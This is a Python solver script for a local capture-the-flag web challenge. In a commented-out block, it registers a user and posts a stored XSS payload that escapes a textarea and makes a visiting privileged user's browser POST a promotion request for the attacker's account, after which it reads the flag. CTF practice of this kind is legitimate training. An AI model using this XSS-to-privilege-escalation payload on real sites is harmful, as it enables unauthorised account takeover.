#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import re

def main():
    url = "http://localhost:8086"
    flag_regex = re.compile("(InfoSec{.+[^}]})")

    # NOTE(abi): try this solution.
    # import time

    # register_un = "DummyUser"
    # register_pw = "12345678A+"
    # payload = {"username": register_un, "password": register_pw}

    # s = requests.Session()
    # res = s.post(url + '/register', data=payload)

    # payload = {"username": register_un, "password": register_pw}
    # res = s.post(url + '/login', data=payload)

    # post_url = "'" + url + "/promote'"
    # attack_script = "</textarea><script>window.onload = function () {var formData = new FormData(); formData.append('username', 'DummyUser');var xh = new XMLHttpRequest();xh.open('POST', " + post_url + ", true);xh.send(formData);}</script>"

    # payload = {"content": attack_script, "csrf_token": s.cookies["csrf_token"]}
    # res = s.post(url + '/post', data=payload)

    # time.sleep(6)

    # res = s.get(url + '/logged_in')

    # flag = re.findall(flag_regex, res.text)
    # print(flag[0])

# ------------------------------------------------------------------------------
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        pass


